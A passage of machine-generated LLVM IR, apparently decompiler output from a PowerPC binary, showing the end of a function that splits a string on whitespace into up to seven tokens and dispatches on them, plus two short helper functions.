  %v0_1000cd20 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000cd20 = load i32, i32* @r28, align 4
  %v2_1000cd20 = inttoptr i32 %v1_1000cd20 to i32*
  store i32 %v0_1000cd20, i32* %v2_1000cd20, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_1000cd28 = load i32, i32* @r28, align 4
  %v2_1000cd28 = add i32 %v1_1000cd28, 12
  %v3_1000cd28 = inttoptr i32 %v2_1000cd28 to i32*
  store i32 16, i32* %v3_1000cd28, align 4
  %v0_1000cd2c = load i32, i32* @r23, align 4
  %v1_1000cd2c = load i32, i32* @r28, align 4
  %v2_1000cd2c = add i32 %v1_1000cd2c, 16
  %v3_1000cd2c = inttoptr i32 %v2_1000cd2c to i32*
  store i32 %v0_1000cd2c, i32* %v3_1000cd2c, align 4
  br label %dec_label_pc_1000cd30

dec_label_pc_1000cd30:                            ; preds = %dec_label_pc_1000ccd4, %dec_label_pc_1000cd04
  %v0_1000cd30 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cd30 = load i32, i32* @r28, align 4
  %v2_1000cd30 = add i32 %v1_1000cd30, 4
  %v3_1000cd30 = inttoptr i32 %v2_1000cd30 to i32*
  store i32 %v0_1000cd30, i32* %v3_1000cd30, align 4
  %v0_1000cd34 = load i32, i32* @r28, align 4
  %v1_1000cd34 = load i32, i32* %r17.global-to-local, align 4
  %v2_1000cd34 = inttoptr i32 %v1_1000cd34 to i32*
  store i32 %v0_1000cd34, i32* %v2_1000cd34, align 4
  br label %dec_label_pc_1000cecc

dec_label_pc_1000cd3c:                            ; preds = %dec_label_pc_1000cc34
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %r21.global-to-local, align 4
  store i32 0, i32* @r23, align 4
  br label %dec_label_pc_1000cd4c

dec_label_pc_1000cd4c:                            ; preds = %dec_label_pc_1000ccac, %dec_label_pc_1000cd3c
  %v1_1000cd54 = phi i32 [ %v1_1000cd54.pre, %dec_label_pc_1000ccac ], [ %arg8, %dec_label_pc_1000cd3c ]
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r26, align 4
  %v2_1000cd54 = inttoptr i32 %v1_1000cd54 to i32*
  store i32 1, i32* %v2_1000cd54, align 4
  br label %dec_label_pc_1000ceb4

dec_label_pc_1000cd5c:                            ; preds = %dec_label_pc_1000ceb4
  %v0_1000cd5c = load i32, i32* @r24, align 4
  store i32 %v0_1000cd5c, i32* @r3, align 4
  store i32 268488040, i32* @lr, align 4
  %v2_1000cd64 = call i32 @function_1000d014(i32 %v0_1000cd5c, i32 35)
  %v4_1000cd68 = icmp eq i32 %v2_1000cd64, 0
  br i1 %v4_1000cd68, label %dec_label_pc_1000cd78, label %dec_label_pc_1000cd70

dec_label_pc_1000cd70:                            ; preds = %dec_label_pc_1000cd5c
  %v3_1000cd64 = inttoptr i32 %v2_1000cd64 to i8*
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v3_1000cd64, align 1
  br label %dec_label_pc_1000cd78

dec_label_pc_1000cd78:                            ; preds = %dec_label_pc_1000cd5c, %dec_label_pc_1000cd70
  %v0_1000cd78 = load i32, i32* @r24, align 4
  store i32 %v0_1000cd78, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v1_1000cdf417 = inttoptr i32 %v0_1000cd78 to i8*
  %v2_1000cdf418 = load i8, i8* %v1_1000cdf417, align 1
  %v3_1000cdf419 = zext i8 %v2_1000cdf418 to i32
  store i32 %v3_1000cdf419, i32* %r0.global-to-local, align 4
  %v3_1000cdf821 = icmp eq i8 %v2_1000cdf418, 0
  br i1 %v3_1000cdf821, label %dec_label_pc_1000ce00, label %dec_label_pc_1000cd90.preheader

dec_label_pc_1000cd84:                            ; preds = %dec_label_pc_1000cda0
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1000cd88 = inttoptr i32 %v0_1000cdc4 to i8*
  store i8 0, i8* %v3_1000cd88, align 1
  %v0_1000cd8c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000cd8c = add i32 %v0_1000cd8c, 1
  store i32 %v1_1000cd8c, i32* %r11.global-to-local, align 4
  %v1_1000cd90 = inttoptr i32 %v1_1000cd8c to i8*
  %v2_1000cd90 = load i8, i8* %v1_1000cd90, align 1
  %v3_1000cd90 = zext i8 %v2_1000cd90 to i32
  store i32 %v3_1000cd90, i32* %r0.global-to-local, align 4
  %v3_1000cd94 = icmp eq i8 %v2_1000cd90, 0
  br i1 %v3_1000cd94, label %dec_label_pc_1000ce00, label %dec_label_pc_1000cda0

dec_label_pc_1000cda0:                            ; preds = %dec_label_pc_1000cd90.preheader, %dec_label_pc_1000cd84
  %v0_1000cdc4 = phi i32 [ %v1_1000cd8c, %dec_label_pc_1000cd84 ], [ %v0_1000cd902, %dec_label_pc_1000cd90.preheader ]
  %v0_1000cda8.in = phi i32 [ %v3_1000cd90, %dec_label_pc_1000cd84 ], [ %v3_1000cd905, %dec_label_pc_1000cd90.preheader ]
  %v0_1000cda8 = mul nuw nsw i32 %v0_1000cda8.in, 2
  %v3_1000cda4 = load i32, i32* @global_var_1001044c, align 4
  store i32 %v3_1000cda4, i32* %r9.global-to-local, align 4
  %v2_1000cda8 = add i32 %v3_1000cda4, %v0_1000cda8
  %v3_1000cda8 = inttoptr i32 %v2_1000cda8 to i16*
  %v4_1000cda8 = load i16, i16* %v3_1000cda8, align 2
  %v5_1000cda8 = zext i16 %v4_1000cda8 to i32
  store i32 %v5_1000cda8, i32* %r0.global-to-local, align 4
  %v1_1000cdac = and i32 %v5_1000cda8, 32
  store i32 %v1_1000cdac, i32* %r9.global-to-local, align 4
  %v3_1000cdac = icmp eq i32 %v1_1000cdac, 0
  br i1 %v3_1000cdac, label %dec_label_pc_1000cdb4, label %dec_label_pc_1000cd84

dec_label_pc_1000cdb4:                            ; preds = %dec_label_pc_1000cda0
  %v0_1000cdb4 = load i32, i32* @r29, align 4
  %v2_1000cdb4 = icmp sgt i32 %v0_1000cdb4, 6
  br i1 %v2_1000cdb4, label %dec_label_pc_1000cdd0.preheader, label %dec_label_pc_1000cdbc

dec_label_pc_1000cdbc:                            ; preds = %dec_label_pc_1000cdb4
  %v1_1000cdbc = mul i32 %v0_1000cdb4, 4
  store i32 %v1_1000cdbc, i32* %r0.global-to-local, align 4
  %v1_1000cdc0 = add i32 %v0_1000cdb4, 1
  store i32 %v1_1000cdc0, i32* @r29, align 4
  %v1_1000cdc4 = load i32, i32* @r30, align 4
  %v3_1000cdc4 = add i32 %v1_1000cdc4, %v1_1000cdbc
  %v4_1000cdc4 = inttoptr i32 %v3_1000cdc4 to i32*
  store i32 %v0_1000cdc4, i32* %v4_1000cdc4, align 4
  %v0_1000cdd09.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000cdd0.preheader

dec_label_pc_1000cdd0.preheader:                  ; preds = %dec_label_pc_1000cdbc, %dec_label_pc_1000cdb4
  %v0_1000cdd09 = phi i32 [ %v0_1000cdd09.pre, %dec_label_pc_1000cdbc ], [ %v0_1000cdc4, %dec_label_pc_1000cdb4 ]
  %v1_1000cdd010 = inttoptr i32 %v0_1000cdd09 to i8*
  %v2_1000cdd011 = load i8, i8* %v1_1000cdd010, align 1
  %v3_1000cdd012 = zext i8 %v2_1000cdd011 to i32
  store i32 %v3_1000cdd012, i32* %r0.global-to-local, align 4
  %v3_1000cdd414 = icmp eq i8 %v2_1000cdd011, 0
  br i1 %v3_1000cdd414, label %dec_label_pc_1000cdf4.loopexit, label %dec_label_pc_1000cde0.lr.ph

dec_label_pc_1000cde0.lr.ph:                      ; preds = %dec_label_pc_1000cdd0.preheader
  %v3_1000cde4.pre = load i32, i32* @global_var_1001044c, align 4
  br label %dec_label_pc_1000cde0

dec_label_pc_1000cdcc:                            ; preds = %dec_label_pc_1000cde0
  %v1_1000cdcc = add i32 %v0_1000cdcc, 1
  store i32 %v1_1000cdcc, i32* %r11.global-to-local, align 4
  %v1_1000cdd0 = inttoptr i32 %v1_1000cdcc to i8*
  %v2_1000cdd0 = load i8, i8* %v1_1000cdd0, align 1
  %v3_1000cdd0 = zext i8 %v2_1000cdd0 to i32
  store i32 %v3_1000cdd0, i32* %r0.global-to-local, align 4
  %v3_1000cdd4 = icmp eq i8 %v2_1000cdd0, 0
  br i1 %v3_1000cdd4, label %dec_label_pc_1000cdf4.loopexit, label %dec_label_pc_1000cde0

dec_label_pc_1000cde0:                            ; preds = %dec_label_pc_1000cde0.lr.ph, %dec_label_pc_1000cdcc
  %v0_1000cdcc = phi i32 [ %v0_1000cdd09, %dec_label_pc_1000cde0.lr.ph ], [ %v1_1000cdcc, %dec_label_pc_1000cdcc ]
  %v0_1000cde8.in = phi i32 [ %v3_1000cdd012, %dec_label_pc_1000cde0.lr.ph ], [ %v3_1000cdd0, %dec_label_pc_1000cdcc ]
  %v0_1000cde8 = mul nuw nsw i32 %v0_1000cde8.in, 2
  store i32 %v3_1000cde4.pre, i32* %r9.global-to-local, align 4
  %v2_1000cde8 = add i32 %v0_1000cde8, %v3_1000cde4.pre
  %v3_1000cde8 = inttoptr i32 %v2_1000cde8 to i16*
  %v4_1000cde8 = load i16, i16* %v3_1000cde8, align 2
  %v5_1000cde8 = zext i16 %v4_1000cde8 to i32
  store i32 %v5_1000cde8, i32* %r0.global-to-local, align 4
  %v1_1000cdec = and i32 %v5_1000cde8, 32
  store i32 %v1_1000cdec, i32* %r9.global-to-local, align 4
  %v3_1000cdec = icmp eq i32 %v1_1000cdec, 0
  br i1 %v3_1000cdec, label %dec_label_pc_1000cdcc, label %dec_label_pc_1000cdf4.loopexit

dec_label_pc_1000cdf4.loopexit:                   ; preds = %dec_label_pc_1000cde0, %dec_label_pc_1000cdcc, %dec_label_pc_1000cdd0.preheader
  %v0_1000cdf4 = phi i32 [ %v0_1000cdd09, %dec_label_pc_1000cdd0.preheader ], [ %v0_1000cdcc, %dec_label_pc_1000cde0 ], [ %v1_1000cdcc, %dec_label_pc_1000cdcc ]
  %v1_1000cdf4 = inttoptr i32 %v0_1000cdf4 to i8*
  %v2_1000cdf4 = load i8, i8* %v1_1000cdf4, align 1
  %v3_1000cdf4 = zext i8 %v2_1000cdf4 to i32
  store i32 %v3_1000cdf4, i32* %r0.global-to-local, align 4
  %v3_1000cdf8 = icmp eq i8 %v2_1000cdf4, 0
  br i1 %v3_1000cdf8, label %dec_label_pc_1000ce00, label %dec_label_pc_1000cd90.preheader

dec_label_pc_1000cd90.preheader:                  ; preds = %dec_label_pc_1000cd78, %dec_label_pc_1000cdf4.loopexit
  %v0_1000cd902 = phi i32 [ %v0_1000cdf4, %dec_label_pc_1000cdf4.loopexit ], [ %v0_1000cd78, %dec_label_pc_1000cd78 ]
  %v1_1000cd903 = inttoptr i32 %v0_1000cd902 to i8*
  %v2_1000cd904 = load i8, i8* %v1_1000cd903, align 1
  %v3_1000cd905 = zext i8 %v2_1000cd904 to i32
  store i32 %v3_1000cd905, i32* %r0.global-to-local, align 4
  %v3_1000cd947 = icmp eq i8 %v2_1000cd904, 0
  br i1 %v3_1000cd947, label %dec_label_pc_1000ce00, label %dec_label_pc_1000cda0

dec_label_pc_1000ce00:                            ; preds = %dec_label_pc_1000cdf4.loopexit, %dec_label_pc_1000cd90.preheader, %dec_label_pc_1000cd84, %dec_label_pc_1000cd78
  %v0_1000ce00 = load i32, i32* @r29, align 4
  %v1_1000ce04 = mul i32 %v0_1000ce00, 4
  store i32 %v1_1000ce04, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000ce0c = load i32, i32* @r30, align 4
  %v3_1000ce0c = add i32 %v2_1000ce0c, %v1_1000ce04
  %v4_1000ce0c = inttoptr i32 %v3_1000ce0c to i32*
  store i32 0, i32* %v4_1000ce0c, align 4
  %tmp55 = icmp slt i32 %v0_1000ce00, 2
  br i1 %tmp55, label %dec_label_pc_1000ceb4, label %dec_label_pc_1000ce14

dec_label_pc_1000ce14:                            ; preds = %dec_label_pc_1000ce00
  %v0_1000ce14 = load i32, i32* %r18.global-to-local, align 4
  %v3_1000ce14 = icmp eq i32 %v0_1000ce14, 1
  br i1 %v3_1000ce14, label %dec_label_pc_1000cecc, label %dec_label_pc_1000ce1c

dec_label_pc_1000ce1c:                            ; preds = %dec_label_pc_1000ce14
  %v3_1000ce1c = icmp eq i32 %v0_1000ce14, 2
  store i32 1, i32* @r31, align 4
  br i1 %v3_1000ce1c, label %dec_label_pc_1000ce28, label %dec_label_pc_1000ce54.preheader

dec_label_pc_1000ce54.preheader:                  ; preds = %dec_label_pc_1000ce1c
  %v1_1000ce5423 = load i32, i32* @r29, align 4
  %v2_1000ce5424 = icmp sgt i32 %v1_1000ce5423, 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1000ce5c29 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1000ce5c29, i32* @r3, align 4
  br i1 %v2_1000ce5424, label %dec_label_pc_1000ce40, label %dec_label_pc_1000ce64

dec_label_pc_1000ce28:                            ; preds = %dec_label_pc_1000ce1c
  %v0_1000ce28 = load i32, i32* @r30, align 4
  %v1_1000ce28 = inttoptr i32 %v0_1000ce28 to i32*
  %v2_1000ce28 = load i32, i32* %v1_1000ce28, align 4
  store i32 %v2_1000ce28, i32* @r4, align 4
  %v0_1000ce2c = load i32, i32* %r15.global-to-local, align 4
  %v2_1000ce30 = inttoptr i32 %v0_1000ce2c to i8*
  %v3_1000ce30 = call i32 @function_10007234(i8* %v2_1000ce30, i32 %v2_1000ce28)
  %v3_1000ce34 = icmp eq i32 %v3_1000ce30, 0
  br i1 %v3_1000ce34, label %dec_label_pc_1000ce6c, label %dec_label_pc_1000ceb4

dec_label_pc_1000ce40:                            ; preds = %dec_label_pc_1000ce54.preheader, %dec_label_pc_1000ce50
  %v1_1000ce40 = phi i32 [ %v1_1000ce58, %dec_label_pc_1000ce50 ], [ 4, %dec_label_pc_1000ce54.preheader ]
  %v0_1000ce5c31 = phi i32 [ %v0_1000ce5c, %dec_label_pc_1000ce50 ], [ %v0_1000ce5c29, %dec_label_pc_1000ce54.preheader ]
  %v0_1000ce40 = load i32, i32* @r30, align 4
  %v2_1000ce40 = add i32 %v0_1000ce40, %v1_1000ce40
  %v3_1000ce40 = inttoptr i32 %v2_1000ce40 to i32*
  %v4_1000ce40 = load i32, i32* %v3_1000ce40, align 4
  store i32 %v4_1000ce40, i32* @r4, align 4
  %v2_1000ce44 = call i32 @function_10007710(i32 %v0_1000ce5c31, i32 %v4_1000ce40)
  %v3_1000ce48 = icmp eq i32 %v2_1000ce44, 0
  %v0_1000ce64.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000ce48, label %dec_label_pc_1000ce40.dec_label_pc_1000ce64_crit_edge, label %dec_label_pc_1000ce50

dec_label_pc_1000ce50:                            ; preds = %dec_label_pc_1000ce40
  %v1_1000ce50 = add i32 %v0_1000ce64.pre, 1
  store i32 %v1_1000ce50, i32* @r31, align 4
  %v1_1000ce54 = load i32, i32* @r29, align 4
  %v2_1000ce54 = icmp slt i32 %v1_1000ce50, %v1_1000ce54
  %v1_1000ce58 = mul i32 %v1_1000ce50, 4
  store i32 %v1_1000ce58, i32* %r0.global-to-local, align 4
  %v0_1000ce5c = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1000ce5c, i32* @r3, align 4
  br i1 %v2_1000ce54, label %dec_label_pc_1000ce40, label %dec_label_pc_1000ce64

dec_label_pc_1000ce40.dec_label_pc_1000ce64_crit_edge: ; preds = %dec_label_pc_1000ce40
  %v1_1000ce64.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000ce64

dec_label_pc_1000ce64:                            ; preds = %dec_label_pc_1000ce50, %dec_label_pc_1000ce40.dec_label_pc_1000ce64_crit_edge, %dec_label_pc_1000ce54.preheader
  %v1_1000ce64 = phi i32 [ %v1_1000ce64.pre, %dec_label_pc_1000ce40.dec_label_pc_1000ce64_crit_edge ], [ %v1_1000ce5423, %dec_label_pc_1000ce54.preheader ], [ %v1_1000ce54, %dec_label_pc_1000ce50 ]
  %v0_1000ce64 = phi i32 [ %v0_1000ce64.pre, %dec_label_pc_1000ce40.dec_label_pc_1000ce64_crit_edge ], [ 1, %dec_label_pc_1000ce54.preheader ], [ %v1_1000ce50, %dec_label_pc_1000ce50 ]
  %v2_1000ce64 = icmp slt i32 %v0_1000ce64, %v1_1000ce64
  br i1 %v2_1000ce64, label %dec_label_pc_1000ce6c, label %dec_label_pc_1000ceb4

dec_label_pc_1000ce6c:                            ; preds = %dec_label_pc_1000ce28, %dec_label_pc_1000ce64
  %v0_1000ce6c = load i32, i32* %r19.global-to-local, align 4
  %v3_1000ce6c = icmp eq i32 %v0_1000ce6c, 2
  br i1 %v3_1000ce6c, label %dec_label_pc_1000ce74, label %dec_label_pc_1000ce90

dec_label_pc_1000ce74:                            ; preds = %dec_label_pc_1000ce6c
  %v0_1000ce74 = load i32, i32* @r30, align 4
  %v1_1000ce74 = inttoptr i32 %v0_1000ce74 to i32*
  %v2_1000ce74 = load i32, i32* %v1_1000ce74, align 4
  %v0_1000ce7c = load i32, i32* @r25, align 4
  store i32 268488324, i32* @lr, align 4
  %v3_1000ce80 = inttoptr i32 %v2_1000ce74 to i8*
  %v4_1000ce80 = call i32 @function_1000c204(i32 2, i8* %v3_1000ce80, i32 %v0_1000ce7c)
  %v2_1000ce84 = icmp sgt i32 %v4_1000ce80, 0
  br i1 %v2_1000ce84, label %dec_label_pc_1000ccd4, label %dec_label_pc_1000ceb0

dec_label_pc_1000ce90:                            ; preds = %dec_label_pc_1000ce6c
  %v3_1000ce90 = icmp eq i32 %v0_1000ce6c, 10
  br i1 %v3_1000ce90, label %dec_label_pc_1000ce98, label %dec_label_pc_1000ceb0

dec_label_pc_1000ce98:                            ; preds = %dec_label_pc_1000ce90
  %v0_1000ce98 = load i32, i32* @r30, align 4
  %v1_1000ce98 = inttoptr i32 %v0_1000ce98 to i32*
  %v2_1000ce98 = load i32, i32* %v1_1000ce98, align 4
  %v0_1000cea0 = load i32, i32* %r21.global-to-local, align 4
  store i32 268488360, i32* @lr, align 4
  %v3_1000cea4 = inttoptr i32 %v2_1000ce98 to i8*
  %v4_1000cea4 = call i32 @function_1000c204(i32 10, i8* %v3_1000cea4, i32 %v0_1000cea0)
  %v2_1000cea8 = icmp sgt i32 %v4_1000cea4, 0
  br i1 %v2_1000cea8, label %dec_label_pc_1000cd04, label %dec_label_pc_1000ceb0

dec_label_pc_1000ceb0:                            ; preds = %dec_label_pc_1000ce74, %dec_label_pc_1000ce90, %dec_label_pc_1000ce98
  store i32 2, i32* @r26, align 4
  br label %dec_label_pc_1000ceb4

dec_label_pc_1000ceb4:                            ; preds = %dec_label_pc_1000ce64, %dec_label_pc_1000ce28, %dec_label_pc_1000ce00, %dec_label_pc_1000ceb0, %dec_label_pc_1000cd4c
  %v0_1000ceb4 = load i32, i32* @r24, align 4
  %v0_1000ceb8 = load i32, i32* @r27, align 4
  %v0_1000cebc = load i32, i32* @r20, align 4
  store i32 268488388, i32* @lr, align 4
  %v3_1000cec0 = call i32 @function_10006950(i32 %v0_1000ceb4, i32 %v0_1000ceb8, i32 %v0_1000cebc)
  %v3_1000cec4 = icmp eq i32 %v3_1000cec0, 0
  br i1 %v3_1000cec4, label %dec_label_pc_1000cecc, label %dec_label_pc_1000cd5c

dec_label_pc_1000cecc:                            ; preds = %dec_label_pc_1000ceb4, %dec_label_pc_1000ce14, %dec_label_pc_1000cd30
  %v0_1000cecc = load i32, i32* %r18.global-to-local, align 4
  %v3_1000cecc = icmp eq i32 %v0_1000cecc, 1
  br i1 %v3_1000cecc, label %dec_label_pc_1000cee4, label %dec_label_pc_1000ced4

dec_label_pc_1000ced4:                            ; preds = %dec_label_pc_1000cecc
  %v0_1000ced4 = load i32, i32* @r20, align 4
  store i32 ptrtoint (i32* @global_var_1000cedc.352 to i32), i32* @lr, align 4
  %v1_1000ced8 = inttoptr i32 %v0_1000ced4 to i16*
  %v2_1000ced8 = call i32 @function_10004e44(i16* %v1_1000ced8)
  br label %dec_label_pc_1000cee4

dec_label_pc_1000cee0:                            ; preds = %dec_label_pc_1000cc98, %dec_label_pc_1000cc68, %dec_label_pc_1000cc60, %dec_label_pc_1000cc54, %dec_label_pc_1000cc44, %dec_label_pc_1000cc2c, %dec_label_pc_1000cc1c
  store i32 34, i32* @r26, align 4
  br label %dec_label_pc_1000cee4

dec_label_pc_1000cee4:                            ; preds = %dec_label_pc_1000cecc, %dec_label_pc_1000ced4, %dec_label_pc_1000ccc4, %dec_label_pc_1000cee0
  store i32 %v0_1000cbe0, i32* %r0.global-to-local, align 4
  %v0_1000cee8 = load i32, i32* @r26, align 4
  ret i32 %v0_1000cee8

; uselistorder directives
  uselistorder i32 %v0_1000ce5c, { 1, 0 }
  uselistorder i32 %v1_1000ce50, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000ce04, { 1, 0 }
  uselistorder i32 %v0_1000ce00, { 1, 0 }
  uselistorder i32 %v3_1000cd905, { 1, 0 }
  uselistorder i32 %v0_1000cd902, { 1, 0 }
  uselistorder i32 %v1_1000cdbc, { 1, 0 }
  uselistorder i32 %v0_1000cdb4, { 1, 0, 2 }
  uselistorder i32 %v2_1000cd64, { 1, 0 }
  uselistorder i32 %v0_1000cc54, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000cc2c.pr, { 1, 0, 2 }
  uselistorder i32 %v1_1000cbf8, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 8, 9, 3, 2, 4, 10, 11, 0, 1 }
  uselistorder i32* %r21.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r19.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r15.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 0, 11, 30, 12, 27, 19, 13, 14, 28, 15, 16, 18, 17, 29, 20, 21, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 23, 24, 25, 26 }
  uselistorder i32 34, { 3, 4, 8, 0, 1, 2, 5, 6, 7 }
  uselistorder i32 (i16*)* @function_10004e44, { 6, 7, 4, 5, 0, 1, 2, 3, 9, 8 }
  uselistorder i32 (i32, i32, i32)* @function_10006950, { 3, 2, 4, 1, 0 }
  uselistorder i32 10, { 10, 28, 29, 30, 31, 32, 33, 34, 17, 18, 19, 20, 21, 36, 35, 37, 38, 7, 39, 2, 41, 3, 42, 1, 8, 11, 45, 12, 25, 4, 5, 22, 9, 6, 27, 40, 43, 44, 13, 0, 23, 24, 14, 26, 15, 16 }
  uselistorder i32 (i32, i32)* @function_10007710, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder i32 (i8*, i32)* @function_10007234, { 1, 2, 3, 4, 0 }
  uselistorder i32 6, { 18, 19, 20, 21, 22, 0, 1, 2, 12, 13, 14, 15, 6, 7, 8, 3, 23, 24, 4, 25, 9, 26, 5, 10, 11, 16, 17 }
  uselistorder i32* @global_var_1001044c, { 0, 3, 1, 4, 5, 2, 6, 7 }
  uselistorder i32 12, { 33, 34, 35, 0, 36, 37, 38, 11, 14, 45, 50, 8, 9, 10, 12, 46, 56, 57, 58, 59, 60, 61, 62, 63, 5, 6, 64, 65, 66, 69, 15, 22, 49, 16, 51, 52, 53, 54, 4, 17, 55, 1, 2, 7, 18, 3, 13, 39, 40, 41, 42, 70, 43, 67, 68, 47, 48, 21, 19, 20, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 44 }
  uselistorder i32 80, { 5, 4, 3, 2, 1, 9, 0, 6, 7, 8 }
  uselistorder i32 48, { 12, 7, 8, 9, 1, 10, 11, 4, 14, 15, 2, 16, 17, 18, 6, 19, 5, 20, 3, 0, 21, 22, 13 }
  uselistorder i32 -48, { 2, 4, 3, 5, 0, 1, 6 }
  uselistorder i32 16, { 29, 9, 30, 31, 10, 32, 33, 0, 34, 35, 1, 36, 11, 55, 56, 66, 67, 37, 38, 39, 57, 58, 59, 60, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 88, 81, 4, 24, 17, 21, 18, 40, 41, 2, 27, 5, 28, 92, 93, 94, 42, 43, 44, 45, 46, 47, 61, 62, 48, 49, 50, 82, 83, 84, 85, 86, 87, 89, 90, 91, 63, 3, 64, 65, 12, 19, 20, 6, 22, 7, 23, 8, 25, 26, 51, 52, 53, 13, 54, 14, 15, 16 }
  uselistorder i32* @r27, { 15, 16, 17, 18, 19, 20, 1, 21, 22, 23, 24, 10, 11, 6, 12, 3, 2, 25, 26, 27, 28, 29, 0, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 57, 58, 80, 4, 81, 7, 82, 87, 55, 56, 40, 41, 42, 43, 83, 84, 85, 59, 60, 44, 45, 46, 61, 62, 5, 63, 64, 65, 66, 8, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 9, 13, 14, 86, 47, 48, 49, 50, 78, 79, 51, 52, 53, 54 }
  uselistorder i32 32, { 27, 28, 29, 18, 30, 31, 19, 15, 16, 24, 1, 2, 3, 32, 33, 38, 20, 17, 39, 40, 13, 14, 25, 26, 12, 34, 35, 36, 41, 42, 21, 43, 44, 45, 46, 47, 48, 49, 0, 50, 51, 37, 5, 6, 4, 8, 7, 22, 23, 10, 11, 9 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000cee4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ceb4, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1000ceb0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000ce6c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce64, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ce40, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce00, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000cd90.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000cde0, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd78, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd4c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd30, { 1, 0 }
  uselistorder label %dec_label_pc_1000cc98, { 1, 0 }
  uselistorder label %dec_label_pc_1000cc2c, { 1, 0 }
}

define i32 @function_1000cefc(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000cefc:
  %v0_1000cefc = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268488468, i32* @lr, align 4
  %v0_1000cf10 = call i32 @function_10004c60()
  %v0_1000cf18 = load i32, i32* @r29, align 4
  store i32 %v0_1000cefc, i32* @lr, align 4
  %v2_1000cf28 = call i32 @function_10004cf0(i32 %v0_1000cf10, i32 %v0_1000cf18)
  ret i32 %v2_1000cf28

; uselistorder directives
  uselistorder i32 ()* @function_10004c60, { 0, 2, 1 }
}

define i32 @function_1000cf2c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000cf2c:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000cf2c = load i32, i32* @lr, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_1000cf58 = call i32 @__asm_mfcr()
  %v1_1000cf5c = and i32 %v0_1000cf58, 268435456
  %v3_1000cf5c = icmp eq i32 %v1_1000cf5c, 0
  store i32 %v0_1000cf58, i32* %r31.global-to-local, align 4
  store i32 %v0_1000cf58, i32* %r0.global-to-local, align 4
  br i1 %v3_1000cf5c, label %dec_label_pc_1000cf80, label %dec_label_pc_1000cf70

dec_label_pc_1000cf70:                            ; preds = %dec_label_pc_1000cf2c
  %v0_1000cf70 = call i32 @function_10004e38()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1000cf78 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000cf78 = inttoptr i32 %v0_1000cf70 to i32*
  store i32 %v0_1000cf78, i32* %v2_1000cf78, align 4
  %v0_1000cf84.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000cf84

dec_label_pc_1000cf80:                            ; preds = %dec_label_pc_1000cf2c
  %v3_1000cf68 = icmp eq i32 %v0_1000cf58, 0
  br i1 %v3_1000cf68, label %dec_label_pc_1000cf90, label %dec_label_pc_1000cf84

dec_label_pc_1000cf84:                            ; preds = %dec_label_pc_1000cf80, %dec_label_pc_1000cf70
  %v0_1000cf84 = phi i32 [ %v0_1000cf58, %dec_label_pc_1000cf80 ], [ %v0_1000cf84.pre, %dec_label_pc_1000cf70 ]
  %tmp = icmp slt i32 %v0_1000cf84, 0
  %v1_1000cf88 = zext i1 %tmp to i32
  %v2_1000cf88 = ashr i32 %v0_1000cf84, 31
  %v3_1000cf88 = and i32 %v2_1000cf88, -2
  %v4_1000cf88 = or i32 %v3_1000cf88, %v1_1000cf88
  br label %dec_label_pc_1000cf98

dec_label_pc_1000cf90:                            ; preds = %dec_label_pc_1000cf80
  %v3_1000cf90 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000cf98

dec_label_pc_1000cf98:                            ; preds = %dec_label_pc_1000cf84, %dec_label_pc_1000cf90
  %v0_1000cfa8 = phi i32 [ %v4_1000cf88, %dec_label_pc_1000cf84 ], [ %v3_1000cf90, %dec_label_pc_1000cf90 ]
  store i32 %v0_1000cf2c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000cfa8

; uselistorder directives
  uselistorder i32 %v0_1000cf84, { 1, 0 }
